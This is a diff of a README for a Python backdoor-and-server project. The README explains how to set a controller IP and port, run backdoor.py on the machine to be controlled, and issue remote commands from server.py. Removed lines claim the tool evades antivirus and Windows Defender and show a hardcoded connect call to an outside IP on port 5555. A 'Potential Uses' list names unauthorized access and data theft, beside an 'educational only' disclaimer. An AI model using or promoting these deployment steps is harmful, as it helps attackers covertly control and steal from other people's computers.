@@ -1,29 +1,29 @@
-## Backdoor-And-Server 🖥️🔍
+# Backdoor-And-Server 💻🔗
 
-This is a simple server-client Python application that allows you to remotely execute basic commands on the server from the backdoor. 
+- Welcome to the Backdoor-And-Server project, a powerful yet educational server-client Python application that enables you to remotely execute commands on the server from the backdoor. 
 
-We can use this project to establish a connection between a server and backdoor , this code is personally crafted and succesful in bypassing the antivirus and windows defender 🍴✨
+## Warning 🚨
+**Please note that this project is intended for educational and research purposes only. Use it responsibly and only on devices and systems for which you have explicit authorization. The author of this project is not responsible for any misuse or illegal activities involving this software.**
 
+## Table of Contents
 
-
-## Warning ⚠️☠️
-
-**This project is intended for educational and research purposes only.**
-
-Please use this code responsibly and only on devices and systems for which you have explicit authorization.
-
-The author of this project are not responsible for any misuse or illegal activities involving this software.
-
+1. [Installation Process](#installation-process) 📥
+2. [Pre-Execution Setup](#pre-execution-setup) ⏮️
+3. [Execution](#execution) 🏃‍♂️
+4. [Available Commands](#available-commands) 💻
+5. [Potential Uses](#potential-uses) 💡
 
 ## Installation Process 📥
 
-First, clone the repository and navigate to the Backdoor-And-Server directory:
+- Let's get you started with Backdoor-And-Server. First, clone the repository and navigate to the `Backdoor-And-Server` directory:
 
-```
+```bash
 $ git clone https://github.com/Advaidv121/Backdoor-And-Server && cd Backdoor-And-Server
 ```
 
-Next, install the requrements using pip3 with the following instructions:
+## Requirements 🛠️
+
+Next, install the requirements using pip3 with the following instructions:
 
 For **Server.py**
 ```
@@ -36,30 +36,30 @@ $ pip3 install tqdm
 
 ## Pre Execution ⏮️
 
-On line number **120** of **server.py** file
+- On line number **137** of **server.py** file
 ```
-36. sock.bind(('xx.xxx.xx.xx',xxxx)) #replace 'xx.xxx.xx.xx'
+137. sock.bind(('xx.xxx.xx.xx',xxxx)) #replace 'xx.xxx.xx.xx' with server ip and xxxx with port number
 ```
-On line number **160** of **backdoor.py** file
+- On line number **153** of **backdoor.py** file
 ```
-160. s.connect(('68.183.89.11',5555))  #replace 'username' 'password'
+153. s.connect(('xx.xxx.xx.xx',xxxx))  #replace 'xx.xxx.xx.xx' with server ip and xxxx with port number
 ```
 
 ## Execution 🏃‍♂️
 
-Run the backdoor.py script on the machine you want to control:
+- Run the backdoor.py script on the machine you want to control:
 ```
 python backdoor.py
 ```
-Run the server.py script on the machine from which you want to control the server:
+- Run the server.py script on the machine from which you want to control the server:
 ```
 python server.py
 ```
-This will establish a connection with the server, and you can start sending commands to be executed on the server.🛜
+- This will establish a connection with the server, and you can start sending commands to be executed on the server.🛜
 
-## Available Commands
+## Available Commands 💡
 
-Here's a table of the commands you can run on the server from the client:
+- Here's a table of the commands you can run on the server from the client:
 
 | Command                | Description                                                     |
 |------------------------|-----------------------------------------------------------------|
@@ -78,9 +78,9 @@ Here's a table of the commands you can run on the server from the client:
 
 
 
-## Potential Uses 💡
+## Potential Uses 🌟
 
-Keyloggers can be used for:
+- Backdoor and server can be used for:
 
 -Unauthorized Access: Malicious actors use backdoors to gain unauthorized access to a computer system, network, or device. This unauthorized access can lead to data theft, surveillance, or further exploitation.
 
